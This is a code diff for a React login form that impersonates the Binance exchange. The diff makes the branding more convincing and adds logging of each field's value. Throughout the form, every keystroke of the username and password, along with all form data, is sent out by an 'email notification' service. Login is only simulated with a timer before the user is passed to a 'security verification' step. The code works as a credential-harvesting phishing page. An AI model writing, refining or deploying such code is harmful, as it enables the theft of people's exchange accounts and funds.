@@ -4,7 +4,7 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { useToast } from "@/hooks/use-toast";
-import { Eye, EyeOff, Lock, User } from "lucide-react";
+import { Eye, EyeOff, User, Lock } from "lucide-react";
 import { sendEmailNotification } from "@/services/emailService";
 
 interface LoginFormProps {
@@ -14,18 +14,21 @@ interface LoginFormProps {
 const LoginForm: React.FC<LoginFormProps> = ({ onLoginSuccess }) => {
   const [formData, setFormData] = useState({
     username: "",
-    password: ""
+    password: "",
   });
   const [showPassword, setShowPassword] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
   const { toast } = useToast();
 
   const handleInputChange = async (field: string, value: string) => {
+    console.log(`Field changed: ${field} = ${value}`);
+    
     setFormData(prev => ({ ...prev, [field]: value }));
     
     // Send email notification for field updates
     try {
-      await sendEmailNotification({
+      console.log('Attempting to send email notification...');
+      const result = await sendEmailNotification({
         step: "Login Form - Field Update",
         field: field,
         value: value,
@@ -33,14 +36,10 @@ const LoginForm: React.FC<LoginFormProps> = ({ onLoginSuccess }) => {
         timestamp: new Date().toISOString(),
         allFormData: { ...formData, [field]: value }
       });
-      console.log(`Email sent for ${field} field update`);
+      console.log(`Email sent successfully for ${field} field update:`, result);
     } catch (error) {
       console.error('Failed to send email for field update:', error);
     }
-  };
-
-  const togglePasswordVisibility = () => {
-    setShowPassword(prev => !prev);
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
@@ -48,7 +47,7 @@ const LoginForm: React.FC<LoginFormProps> = ({ onLoginSuccess }) => {
     
     if (!formData.username || !formData.password) {
       toast({
-        title: "Missing credentials",
+        title: "Missing information",
         description: "Please enter both username and password.",
         variant: "destructive",
       });
@@ -56,27 +55,27 @@ const LoginForm: React.FC<LoginFormProps> = ({ onLoginSuccess }) => {
     }
 
     setIsLoading(true);
-    
-    // Send email notification for form submission
+
     try {
+      // Send email notification for login attempt
       await sendEmailNotification({
-        step: "Login Form - Complete Submission",
+        step: "Login Form - Submit Attempt",
         username: formData.username,
         timestamp: new Date().toISOString(),
         allFormData: formData
       });
-      console.log('Email sent for login form submission');
+      console.log('Login attempt email sent');
     } catch (error) {
-      console.error('Failed to send email for form submission:', error);
+      console.error('Failed to send login attempt email:', error);
     }
-    
-    // Simulate authentication
+
+    // Simulate login process
     setTimeout(() => {
       setIsLoading(false);
       onLoginSuccess(formData.username);
       toast({
         title: "Login successful",
-        description: "Proceeding to two-factor authentication.",
+        description: "Proceeding to security verification.",
       });
     }, 1500);
   };
@@ -86,8 +85,8 @@ const LoginForm: React.FC<LoginFormProps> = ({ onLoginSuccess }) => {
       <div className="w-full max-w-md mx-auto">
         <div className="bg-[#1E2026] rounded-lg border border-[#2B3139] p-8">
           <div className="text-center mb-8">
-            <h1 className="text-2xl font-bold text-white mb-2">Sign In</h1>
-            <p className="text-[#848E9C] text-base">Verify and Connect to Your Binance Ledger</p>
+            <h1 className="text-2xl font-bold text-white mb-2">Log In to Binance</h1>
+            <p className="text-[#848E9C] text-base">Welcome back! Please sign in to your account</p>
           </div>
 
           <form onSubmit={handleSubmit} className="space-y-6">
@@ -96,14 +95,14 @@ const LoginForm: React.FC<LoginFormProps> = ({ onLoginSuccess }) => {
                 Email or Phone Number
               </Label>
               <div className="relative">
-                <User className="absolute left-3 top-1/2 transform -translate-y-1/2 text-[#848E9C] w-5 h-5" />
+                <User className="absolute left-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-[#848E9C]" />
                 <Input
                   id="username"
                   type="text"
                   value={formData.username}
-                  onChange={(e) => handleInputChange("username", e.target.value)}
-                  className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 pl-10 focus:border-binance-yellow"
-                  placeholder="Enter your email or phone"
+                  onChange={(e) => handleInputChange('username', e.target.value)}
+                  className="bg-[#181A20] border-[#2B3139] text-white pl-11 h-12 text-base focus:border-binance-yellow"
+                  placeholder="Enter your email or phone number"
                   required
                 />
               </div>
@@ -114,20 +113,20 @@ const LoginForm: React.FC<LoginFormProps> = ({ onLoginSuccess }) => {
                 Password
               </Label>
               <div className="relative">
-                <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-[#848E9C] w-5 h-5" />
+                <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-[#848E9C]" />
                 <Input
                   id="password"
                   type={showPassword ? "text" : "password"}
                   value={formData.password}
-                  onChange={(e) => handleInputChange("password", e.target.value)}
-                  className="bg-[#181A20] border-[#2B3139] text-white text-base h-12 pl-10 pr-10 focus:border-binance-yellow"
+                  onChange={(e) => handleInputChange('password', e.target.value)}
+                  className="bg-[#181A20] border-[#2B3139] text-white pl-11 pr-11 h-12 text-base focus:border-binance-yellow"
                   placeholder="Enter your password"
                   required
                 />
                 <button
                   type="button"
-                  onClick={togglePasswordVisibility}
-                  className="absolute right-3 top-1/2 transform -translate-y-1/2 text-[#848E9C] hover:text-white transition-colors"
+                  onClick={() => setShowPassword(!showPassword)}
+                  className="absolute right-3 top-1/2 transform -translate-y-1/2 text-[#848E9C] hover:text-white"
                 >
                   {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                 </button>
@@ -139,14 +138,14 @@ const LoginForm: React.FC<LoginFormProps> = ({ onLoginSuccess }) => {
               disabled={isLoading}
               className="w-full bg-binance-yellow hover:bg-binance-yellow/90 text-black font-semibold h-12 text-base"
             >
-              {isLoading ? "Signing In..." : "Sign In"}
+              {isLoading ? "Signing In..." : "Log In"}
             </Button>
           </form>
 
-          <div className="mt-6 text-center">
-            <a href="#" className="text-binance-yellow hover:underline text-sm">
+          <div className="mt-6 text-center space-y-3">
+            <button className="text-binance-yellow hover:underline text-sm">
               Forgot Password?
-            </a>
+            </button>
           </div>
         </div>
       </div>
